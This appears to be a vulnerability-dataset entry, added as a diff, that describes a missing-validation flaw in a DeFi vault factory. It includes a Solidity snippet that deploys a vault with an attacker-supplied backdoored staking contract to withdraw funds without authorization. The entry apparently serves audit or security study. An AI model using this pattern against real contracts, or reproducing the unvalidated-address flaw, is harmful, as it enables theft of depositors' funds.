@@ -1,0 +1,40 @@
+Type of vulnerability: Improper Input Validation
+Cause of vulnerability: Lack of validation checks on the Staking contract address provided during the deployment of a Vault.
+Execution process: An attacker creates a malicious Staking contract with a backdoor function allowing unauthorized fund withdrawals. The attacker then deploys a Vault using this malicious Staking contract address, which bypasses the absence of checks ensuring the Staking contract is from an approved template.
+Vulnerable code: 
+```solidity
+address vault = controller.deployVault(
+    VaultInitParams({
+        asset: iAsset,
+        adapter: IERC4626(address(0)),
+        fees: VaultFees({
+            deposit: 100,
+            withdrawal: 200,
+            management: 300,
+            performance: 400
+        }),
+        feeRecipient: feeRecipient,
+        owner: address(this)
+    }),
+    DeploymentArgs({
+        id: templateId,
+        data: abi.encode(uint256(100))
+    }),
+    DeploymentArgs({
+        id: 0,
+        data: ""
+    }),
+    address(maliciousStaking),
+    "",
+    VaultMetadata({
+        vault: address(0),
+        staking: address(maliciousStaking),
+        creator: alice,
+        metadataCID: metadataCid,
+        swapTokenAddresses: swapTokenAddresses,
+        swapAddress: address(0x5555),
+        exchange: uint256(1)
+    }),
+    0
+);
+```
